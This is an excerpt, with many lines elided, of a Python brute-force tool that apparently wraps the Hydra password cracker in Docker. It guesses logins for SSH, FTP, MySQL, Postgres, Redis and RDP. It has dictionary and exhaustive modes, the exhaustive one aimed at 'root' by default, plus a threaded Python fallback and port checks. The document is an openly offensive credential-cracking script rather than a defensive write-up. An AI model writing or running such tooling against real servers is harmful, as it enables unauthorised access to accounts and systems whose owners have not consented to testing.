...
def run_hydra_attack(target, service, credentials):
    ...
    with tempfile.NamedTemporaryFile(
        "w", delete=False
    ) as f_users, tempfile.NamedTemporaryFile("w", delete=False) as f_pass:
    ...
    log_result(
        ...
        service,
        False,
        error=f"[HYDRA] Launching Dockerized Hydra attack with {len(credentials)} combinations",
    )
    ...
    cmd = [
        ...
        "--rm",
        "-v",
        f"{user_file}:/tmp/users.txt",
        "-v",
        f"{pass_file}:/tmp/pass.txt",
        "secsi/hydra",
        "-L",
        "/tmp/users.txt",
        "-P",
    ...
    try:
        ...
        for line in iter(proc.stdout.readline, ""):
            if "[ATTEMPT]" in line:
                ...
                if (
                    attempt_count == 1
                    or attempt_count % 10 == 0
                    or attempt_count == total_tries
                ):
                    if total_tries == 0:
                        total_tries = attempt_count * 10
...
def run_hydra_algo_attack(target, service, username, charset, min_len, max_len):
    ...
    log_result(
        ...
        service,
        False,
        error=f"[HYDRA] Launching Algorithmic attack (user: {username}, chars: {charset}, len: {min_len}-{max_len})",
    )
    ...
    try:
        ...
        for line in iter(proc.stdout.readline, ""):
            ...
            if "[ATTEMPT]" in line:
                ...
                if (
                    ...
                    if total_tries == 0:
                        total_tries = attempt_count * 10  # Fallback
                    print(f"[PROGRESS] {attempt_count}/{total_tries}")
                    sys.stdout.flush()
        ...
        log_result(
            ...
            service,
            False,
            error="Algorithmic generation exhausted without success",
        )
        return False
    except Exception as e:
        log_result(target, service, False, error=f"Hydra execution failed: {e}")
...
def run_python_algo_attack(
    target, service, username, charset, min_len, max_len, threads=5
):
    import itertools
    import concurrent.futures
    import sys
    ...
    log_result(
        ...
        service,
        False,
        error=f"[PYTHON] Launching Algorithmic attack (user: {username}, chars: {charset}, len: {min_len}-{max_len})",
    )
    ...
    if not success_found:
        log_result(
            target, service, False, error="Algorithmic exhausted without success"
        )
...
def main():
    ...
    parser.add_argument(
        "--service",
        required=True,
        choices=["ssh", "ftp", "mysql", "postgres", "redis", "rdp"],
        help="Service to attack",
    )
    parser.add_argument(
        "--threads", type=int, default=5, help="Number of concurrent threads"
    )
    ...
    parser.add_argument(
        "--algo",
        action="store_true",
        help="Enable algorithmic (exhaustive) brute force",
    )
    parser.add_argument(
        "--algo-user",
        type=str,
        default="root",
        help="Username to target in algorithmic mode",
    )
    parser.add_argument(
        "--algo-charset",
        type=str,
        default="aA1",
        help="Hydra charset string (e.g. aA1)",
    )
    ...
    if sock.connect_ex((args.target, port)) != 0:
        log_result(
            args.target, args.service, False, error=f"Port {port} is closed or filtered"
        )
        return
    sock.close()
    ...
    if has_docker() and args.service in [
        "ssh",
        "ftp",
        "mysql",
        "postgres",
    ...
    log_result(
        ...
        args.service,
        False,
        error=f"Starting Python fallback attack with {len(credentials)} combinations",
    )
    ...
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_creds = {
            executor.submit(check_creds, args.target, args.service, u, p): (u, p)
    ...
    if not success_found:
        log_result(
            ...
            args.service,
            False,
            error="Dictionary exhausted without success",
        )
